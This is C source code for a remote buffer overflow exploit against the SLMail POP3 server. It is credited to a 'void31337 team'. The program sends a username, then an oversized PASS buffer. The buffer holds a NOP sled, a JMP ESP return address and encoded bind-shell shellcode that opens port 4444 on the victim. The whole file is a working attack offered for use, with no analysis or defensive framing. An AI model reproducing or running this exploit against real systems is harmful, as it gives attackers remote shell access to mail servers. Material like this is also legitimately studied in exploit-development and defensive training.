/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] = 
"\xbb\xca\xbf\x16\xab\xda\xd0\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x5d\x12\x83\xc5\x04\x03\x97\xb1\xf4\x5e\xdb\x26\x7a"
"\xa0\x23\xb7\x1b\x28\xc6\x86\x1b\x4e\x83\xb9\xab\x04\xc1\x35"
"\x47\x48\xf1\xce\x25\x45\xf6\x67\x83\xb3\x39\x77\xb8\x80\x58"
"\xfb\xc3\xd4\xba\xc2\x0b\x29\xbb\x03\x71\xc0\xe9\xdc\xfd\x77"
"\x1d\x68\x4b\x44\x96\x22\x5d\xcc\x4b\xf2\x5c\xfd\xda\x88\x06"
"\xdd\xdd\x5d\x33\x54\xc5\x82\x7e\x2e\x7e\x70\xf4\xb1\x56\x48"
"\xf5\x1e\x97\x64\x04\x5e\xd0\x43\xf7\x15\x28\xb0\x8a\x2d\xef"
"\xca\x50\xbb\xeb\x6d\x12\x1b\xd7\x8c\xf7\xfa\x9c\x83\xbc\x89"
"\xfa\x87\x43\x5d\x71\xb3\xc8\x60\x55\x35\x8a\x46\x71\x1d\x48"
"\xe6\x20\xfb\x3f\x17\x32\xa4\xe0\xbd\x39\x49\xf4\xcf\x60\x06"
"\x39\xe2\x9a\xd6\x55\x75\xe9\xe4\xfa\x2d\x65\x45\x72\xe8\x72"
"\xaa\xa9\x4c\xec\x55\x52\xad\x25\x92\x06\xfd\x5d\x33\x27\x96"
"\x9d\xbc\xf2\x39\xcd\x12\xad\xf9\xbd\xd2\x1d\x92\xd7\xdc\x42"
"\x82\xd8\x36\xeb\x29\x23\xd1\x1e\xa5\x2b\x1d\x77\xbb\x2b\x4c"
"\xdb\x32\xcd\x04\xf3\x12\x46\xb1\x6a\x3f\x1c\x20\x72\x95\x59"
"\x62\xf8\x1a\x9e\x2d\x09\x56\x8c\xda\xf9\x2d\xee\x4d\x05\x98"
"\x86\x12\x94\x47\x56\x5c\x85\xdf\x01\x09\x7b\x16\xc7\xa7\x22"
"\x80\xf5\x35\xb2\xeb\xbd\xe1\x07\xf5\x3c\x67\x33\xd1\x2e\xb1"
"\xbc\x5d\x1a\x6d\xeb\x0b\xf4\xcb\x45\xfa\xae\x85\x3a\x54\x26"
"\x53\x71\x67\x30\x5c\x5c\x11\xdc\xed\x09\x64\xe3\xc2\xdd\x60"
"\x9c\x3e\x7e\x8e\x77\xfb\x8e\xc5\xd5\xaa\x06\x80\x8c\xee\x4a"
"\x33\x7b\x2c\x73\xb0\x89\xcd\x80\xa8\xf8\xc8\xcd\x6e\x11\xa1"
"\x5e\x1b\x15\x16\x5e\x0e";


void exploit(int sock) {
      FILE *test;
      char *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3500];
      char buf[3500];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3500);
      memset(evil, 0x00, 2606);
      memset(evil, 0x41, 2606);
      ptr = evil;
      ptr = ptr + 2606; // 2608 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 16;
      memcpy(ptr, &shellcode, 355);
      *(long*)&evil[2606] = 0x5F4A358F; // JMP ESP XP 7CB41020 FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
